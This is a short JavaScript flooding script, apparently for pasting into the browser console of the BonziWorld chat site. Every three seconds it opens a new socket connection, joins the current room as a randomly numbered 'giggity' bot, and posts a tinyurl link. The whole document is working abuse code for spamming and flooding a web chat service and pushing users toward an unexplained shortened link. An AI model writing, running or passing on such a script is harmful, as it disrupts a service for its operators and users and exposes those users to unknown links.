/* GGTFlood 4 BonziWorld 1.0.1 */
/* This comes with no warranty */
setInterval(() => {
    const roomElement = document.querySelector(".room_id");
    const roomId = roomElement ? roomElement.textContent.trim() : "default";
    const bot = io(location.href);
    bot.emit("client", "MAIN");
    bot.emit("login", {
        passcode: "",
        name: "giggity #" + Math.floor(Math.random() * 10000),
        room: roomId,
    });
    setTimeout(() => {
        bot.emit("talk", "tinyurl.com/ggtfiles");
    }, 500);
}, 3000);
